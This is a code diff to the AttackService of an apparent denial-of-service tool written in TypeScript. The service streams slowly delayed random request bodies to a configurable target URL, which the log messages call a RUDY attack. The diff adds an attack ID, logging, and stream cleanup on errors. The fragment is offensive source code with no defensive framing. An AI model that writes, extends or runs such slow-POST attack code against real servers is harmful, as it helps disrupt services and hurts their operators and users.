@@ -5,7 +5,7 @@
 //  Created by Sahil Chaddha on 09/05/2018.
 //  Copyright © 2018 Tribe-CMS.tv. All rights reserved.
 //
-/* tslint:disable object-literal-sort-keys object-literal-key-quotes */
+/* tslint:disable object-literal-sort-keys object-literal-key-quotes no-this-assignment */
 import IService from "./service"
 import logger from "../utils/logger"
 import NetworkService, { HTTPMethod, IResponsePayload } from "./network.service"
@@ -20,6 +20,7 @@ export interface IAttackServiceResponsePayload {
 }
 
 export interface IAttackServiceConfig {
+    attackId: number
     target: string
     method: HTTPMethod
     packet_len: number
@@ -36,13 +37,21 @@ class AttackService implements IService {
         this.streamService = new StreamService({delay: this.config.delay})
     }
     public attack() {
+        logger.verbose({message: "Attacking Endpoint attackId : " + this.config.attackId, category: "Network_Service",
+                        data: this.config})
+
+        const self = this
+
         NetworkService.request({url: this.config.target, method: this.config.method, headers: this.getHeaders(),
                                 data: this.streamService.getRandomReadStream()})
         .then((resPayload: IResponsePayload) => {
-            console.log(resPayload)
+            logger.info({message: "Request Succeeded. RUDY attack failed attackId : " + self.config.attackId,
+                         category: this.serviceName})
         })
         .catch((err) => {
-            console.log(err)
+            logger.error({message: err.code + " :: Error Occured attackId : " + self.config.attackId,
+                          category: self.serviceName, data: err})
+            self.streamService.endStream()
         })
     }
 
